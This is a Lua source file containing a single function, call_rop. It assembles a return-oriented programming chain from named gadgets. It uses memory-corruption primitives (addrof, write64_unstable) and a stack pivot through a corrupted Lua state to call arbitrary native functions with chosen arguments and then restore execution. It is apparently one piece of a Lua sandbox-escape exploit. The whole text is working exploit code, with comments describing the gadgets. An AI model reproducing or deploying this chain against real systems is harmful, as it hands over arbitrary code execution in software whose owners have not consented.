
function call_rop(address, rax, arg1, arg2, arg3, arg4, arg5, arg6)
    local idx = 0
    
    rax = rax or 0
    
    local function process_arg(arg)
        if arg == nil then
            return 0
        elseif type(arg) == "string" then
            return addrof(arg) + 0x20
        else
            return arg
        end
    end
    
    arg1 = process_arg(arg1)
    arg2 = process_arg(arg2)
    arg3 = process_arg(arg3)
    arg4 = process_arg(arg4)
    arg5 = process_arg(arg5)
    arg6 = process_arg(arg6)
    
    local function push_chain(value)
        write64_unstable(LUA_PIVOT_SCRATCH + 0x40 + idx * 8, value)
        idx = idx + 1
    end
    
    -- Backup RBP
    -- xchg rax, rbp ; sub al, 0x00 ; movsxd rdx, qword [rcx+rsi*4] ; add rdx, rcx ; jmp rdx ; 
    push_chain(POP_RCX_RET)
    push_chain(STRING_BASE)
    push_chain(POP_RSI_RET)
    push_chain(0)  -- [RCX + RSI*4] = [STRING_BASE]    
    local offset = RET - STRING_BASE
    write64_unstable(STRING_BASE, offset)
    push_chain(XCHG_RAX_RBP)
    -- RAX = original RBP, jmp to RET, continues chain
    push_chain(POP_RDI_RET)
    push_chain(STRING_BASE + 0x10) -- Store RBP to STRING_BASE + 0x10
    push_chain(MOV_DEREF_RDI_RAX_RET)

    -- r8 and r9
    -- pop r8 ; xor eax, eax ; mov word [rbx], cx ; pop rbx ; pop r14 ; pop rbp ; ret
    -- mov r9, qword [rbp-0x50] ; mov rbx, qword [rbp-0x40] ; mov eax, 0xFFFFFFFC ; mov esi, 0xFFFFFFFD ; mov edi, 0x00000001 ; add rcx, r8 ; jmp rcx ;
    push_chain(POP_RBX_RET)
    push_chain(STRING_BASE + 0x8)
    push_chain(POP_R8_RET)
    push_chain(arg5)
    push_chain(0)
    push_chain(0)
    push_chain(STRING_BASE + 0x70) -- rbp
    write64_unstable(STRING_BASE + 0x20, arg6)
    push_chain(POP_RCX_RET)
    push_chain(RET - arg5)
    push_chain(MOV_R9_RET)
    
    -- Restore RBP before calling the function (Maybe not needed?)
    push_chain(POP_RAX_RET)
    push_chain(STRING_BASE + 0x10)
    push_chain(MOV_RAX_DEREF_RAX_RET)
    local rbp_placeholder_offset = idx + 4
    push_chain(POP_RDI_RET)
    push_chain(LUA_PIVOT_SCRATCH + 0x40 + rbp_placeholder_offset * 8)
    push_chain(MOV_DEREF_RDI_RAX_RET)
    push_chain(POP_RBP_RET)
    push_chain(0xDEADBEEF) -- dummy will be changed dynamically

    push_chain(POP_RAX_RET)
    push_chain(rax)
    
    push_chain(POP_RDI_RET)
    push_chain(arg1)
    
    push_chain(POP_RSI_RET)
    push_chain(arg2)
    
    push_chain(POP_RDX_RET)
    push_chain(arg3)
    
    push_chain(POP_RCX_RET)
    push_chain(arg4)

    -- Call target function
    push_chain(address)
    
    -- Save return value to STRING_BASE + 0x30
    push_chain(POP_RDI_RET)
    push_chain(STRING_BASE + 0x30)
    push_chain(MOV_DEREF_RDI_RAX_RET)
        
    -- Load saved RBP into RAX 
    push_chain(POP_RAX_RET)
    push_chain(STRING_BASE + 0x10)
    push_chain(MOV_RAX_DEREF_RAX_RET)
    
    -- Setup for second XCHG
    push_chain(POP_RCX_RET)
    push_chain(STRING_BASE)
    push_chain(POP_RSI_RET)
    push_chain(0)
    push_chain(XCHG_RAX_RBP)
    
    -- Restore registers
    push_chain(POP_R15_RET)
    push_chain(LUA_STATE)
    
    -- Restore corrupted LUA_PIVOT_SCRATCH at LUA_STATE
    push_chain(POP_RAX_RET)
    push_chain(LUA_PIVOT_SCRATCH)
    push_chain(POP_RDI_RET)
    push_chain(LUA_STATE)
    push_chain(MOV_DEREF_RDI_RAX_RET)

    -- Calculate original RSP = RBP - 0x48
    push_chain(POP_RAX_RET)
    push_chain(STRING_BASE + 0x10)
    push_chain(MOV_RAX_DEREF_RAX_RET)
    push_chain(POP_RDX_RET)
    push_chain(0x48)
    push_chain(SUB_RAX_RDX_RET)  -- RAX = RBP - 0x48

    -- Write calculated RSP to the placeholder location
    local rsp_placeholder_offset = idx + 4
    push_chain(POP_RDI_RET)
    push_chain(LUA_PIVOT_SCRATCH + 0x40 + rsp_placeholder_offset * 8)
    push_chain(MOV_DEREF_RDI_RAX_RET)
    push_chain(POP_RSP_RET)
    push_chain(0xDEADBEEF) -- dummy will be changed dynamically
    
    write64_unstable(LUA_PIVOT_SCRATCH, 0x40)
    write64_unstable(LUA_PIVOT_SCRATCH + 0x20, LUA_PIVOT2)
    
    -- Execute ROP chain
    call_rop_internal()
    
    -- Read and return result
    return read64_unstable(STRING_BASE + 0x30)
end

